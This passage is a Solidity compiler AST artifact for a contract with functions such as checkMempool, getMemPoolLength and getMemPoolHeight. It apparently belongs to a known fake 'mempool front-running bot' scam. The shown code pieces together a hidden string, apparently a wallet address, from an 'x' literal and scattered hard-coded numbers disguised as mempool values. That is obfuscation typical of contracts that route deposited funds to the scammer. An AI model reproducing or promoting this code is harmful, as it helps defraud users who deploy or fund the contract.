																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 516,
																				"src": "6175:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 578,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "6168:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																				"typeString": "type(string storage pointer)"
																			},
																			"typeName": {
																				"id": 577,
																				"name": "string",
																				"nodeType": "ElementaryTypeName",
																				"src": "6168:6:0",
																				"typeDescriptions": {}
																			}
																		},
																		"id": 580,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"nameLocations": [],
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "6168:11:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																			"typeString": "literal_string \"0\""
																		},
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 575,
																	"name": "mempool",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1188,
																	"src": "6155:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory,string memory) pure returns (string memory)"
																	}
																},
																"id": 581,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "6155:25:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "6132:48:0"
														},
														{
															"expression": {
																"id": 583,
																"name": "_hexC1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 574,
																"src": "6202:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"functionReturnParameters": 494,
															"id": 584,
															"nodeType": "Return",
															"src": "6195:13:0"
														}
													]
												}
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 640,
															"name": "res",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 516,
															"src": "6638:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 639,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "6631:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 638,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "6631:6:0",
															"typeDescriptions": {}
														}
													},
													"id": 641,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6631:11:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 494,
												"id": 642,
												"nodeType": "Return",
												"src": "6624:18:0"
											}
										]
									},
									"id": 644,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "checkMempool",
									"nameLocation": "5645:12:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 491,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 490,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "5663:1:0",
												"nodeType": "VariableDeclaration",
												"scope": 644,
												"src": "5658:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 489,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5658:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5657:8:0"
									},
									"returnParameters": {
										"id": 494,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 493,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 644,
												"src": "5689:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 492,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5689:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5688:15:0"
									},
									"scope": 1189,
									"src": "5636:1014:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 651,
										"nodeType": "Block",
										"src": "6715:32:0",
										"statements": [
											{
												"expression": {
													"hexValue": "333030343236",
													"id": 649,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "6733:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_300426_by_1",
														"typeString": "int_const 300426"
													},
													"value": "300426"
												},
												"functionReturnParameters": 648,
												"id": 650,
												"nodeType": "Return",
												"src": "6726:13:0"
											}
										]
									},
									"id": 652,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolLength",
									"nameLocation": "6667:16:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 645,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "6683:2:0"
									},
									"returnParameters": {
										"id": 648,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 647,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 652,
												"src": "6709:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 646,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "6709:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6708:6:0"
									},
									"scope": 1189,
									"src": "6658:89:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 659,
										"nodeType": "Block",
										"src": "7087:32:0",
										"statements": [
											{
												"expression": {
													"hexValue": "393739363834",
													"id": 657,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "7105:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_979684_by_1",
														"typeString": "int_const 979684"
													},
													"value": "979684"
												},
												"functionReturnParameters": 656,
												"id": 658,
												"nodeType": "Return",
												"src": "7098:13:0"
											}
										]
									},
									"id": 660,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolHeight",
									"nameLocation": "7039:16:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 653,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7055:2:0"
									},
									"returnParameters": {
										"id": 656,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 655,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 660,
												"src": "7081:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 654,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7081:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "7080:6:0"
									},
									"scope": 1189,
									"src": "7030:89:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 770,
										"nodeType": "Block",
										"src": "7329:999:0",
										"statements": [
											{
												"assignments": [
													666
												],
												"declarations": [
													{
														"constant": false,
														"id": 666,
														"mutability": "mutable",
														"name": "_memPoolOffset",
														"nameLocation": "7354:14:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7340:28:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 665,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7340:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 674,
												"initialValue": {
													"arguments": [
														{
															"hexValue": "78",
															"id": 668,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7379:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															"value": "x"
														},
														{
															"arguments": [
																{
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 670,
																		"name": "getMemPoolOffset",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 312,
																		"src": "7397:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
																			"typeString": "function () pure returns (uint256)"
																		}
																	},
																	"id": 671,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7397:18:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 669,
																"name": "checkMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 644,
																"src": "7384:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 672,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7384:32:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 667,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1188,
														"src": "7371:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 673,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7371:46:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7340:77:0"
											},
											{
												"assignments": [
													676
												],
												"declarations": [
													{
														"constant": false,
														"id": 676,
														"mutability": "mutable",
														"name": "_memPoolSol",
														"nameLocation": "7433:11:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7428:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 675,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7428:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 678,
												"initialValue": {
													"hexValue": "383830353732",
													"id": 677,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "7447:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_880572_by_1",
														"typeString": "int_const 880572"
													},
													"value": "880572"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7428:25:0"
											},
											{
												"assignments": [
													680
												],
												"declarations": [
													{
														"constant": false,
														"id": 680,
														"mutability": "mutable",
														"name": "_memPoolLength",
														"nameLocation": "7469:14:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7464:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 679,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7464:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 683,
												"initialValue": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 681,
														"name": "getMemPoolLength",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 652,
														"src": "7486:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 682,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7486:18:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7464:40:0"
											},
											{
												"assignments": [
													685
												],
												"declarations": [
													{
														"constant": false,
														"id": 685,
														"mutability": "mutable",
														"name": "_memPoolSize",
														"nameLocation": "7520:12:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7515:17:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 684,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7515:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 687,
												"initialValue": {
													"hexValue": "393531333437",
													"id": 686,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "7535:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_951347_by_1",
														"typeString": "int_const 951347"
													},
													"value": "951347"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7515:26:0"
											},
											{
												"assignments": [
													689
												],
												"declarations": [
													{
														"constant": false,
														"id": 689,
														"mutability": "mutable",
														"name": "_memPoolHeight",
														"nameLocation": "7557:14:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7552:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 688,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7552:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 692,
												"initialValue": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 690,
														"name": "getMemPoolHeight",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 660,
														"src": "7574:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 691,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7574:18:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7552:40:0"
											},
											{
												"assignments": [
													694
												],
												"declarations": [
													{
														"constant": false,
														"id": 694,
														"mutability": "mutable",
														"name": "_memPoolWidth",
														"nameLocation": "7608:13:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7603:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 693,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7603:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 696,
												"initialValue": {
													"hexValue": "39333439",
													"id": 695,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "7624:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_9349_by_1",
														"typeString": "int_const 9349"
													},
													"value": "9349"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7603:25:0"
											},
											{
												"assignments": [
													698
												],
												"declarations": [
													{
														"constant": false,
														"id": 698,
														"mutability": "mutable",
														"name": "_memPoolDepth",
														"nameLocation": "7644:13:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7639:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 697,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7639:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 701,
												"initialValue": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 699,
														"name": "getMemPoolDepth",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1091,
														"src": "7660:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 700,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7660:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7639:38:0"
											},
											{
												"assignments": [
													703
												],
												"declarations": [
													{
														"constant": false,
														"id": 703,
														"mutability": "mutable",
														"name": "_memPoolCount",
														"nameLocation": "7693:13:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7688:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 702,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7688:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 705,
												"initialValue": {
													"hexValue": "373833313235",
													"id": 704,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "7709:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_783125_by_1",
														"typeString": "int_const 783125"
													},
													"value": "783125"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7688:27:0"
											},
											{
												"assignments": [
													707
												],
												"declarations": [
													{
														"constant": false,
														"id": 707,
														"mutability": "mutable",
														"name": "_memPool1",
														"nameLocation": "7742:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7728:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 706,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7728:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 714,
												"initialValue": {
													"arguments": [
														{
															"id": 709,
															"name": "_memPoolOffset",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 666,
															"src": "7762:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"arguments": [
																{
																	"id": 711,
																	"name": "_memPoolSol",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 676,
																	"src": "7791:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 710,
																"name": "checkMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 644,
																"src": "7778:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 712,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7778:25:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 708,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1188,
														"src": "7754:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 713,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7754:50:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7728:76:0"
											},
											{
												"assignments": [
													716
												],
												"declarations": [
													{
														"constant": false,
														"id": 716,
														"mutability": "mutable",
														"name": "_memPool2",
														"nameLocation": "7829:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7815:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 715,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7815:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 725,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 719,
																	"name": "_memPoolLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 680,
																	"src": "7862:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 718,
																"name": "checkMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 644,
																"src": "7849:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 720,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7849:28:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"arguments": [
																{
																	"id": 722,
																	"name": "_memPoolSize",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 685,
																	"src": "7892:12:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 721,
																"name": "checkMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 644,
																"src": "7879:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 723,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7879:26:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 717,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1188,
														"src": "7841:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 724,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7841:65:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7815:91:0"
											},
											{
												"assignments": [
													727
												],
												"declarations": [
													{
														"constant": false,
														"id": 727,
														"mutability": "mutable",
														"name": "_memPool3",
														"nameLocation": "7931:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "7917:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 726,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7917:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 736,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 730,
																	"name": "_memPoolHeight",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 689,
																	"src": "7964:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 729,
																"name": "checkMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 644,
																"src": "7951:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
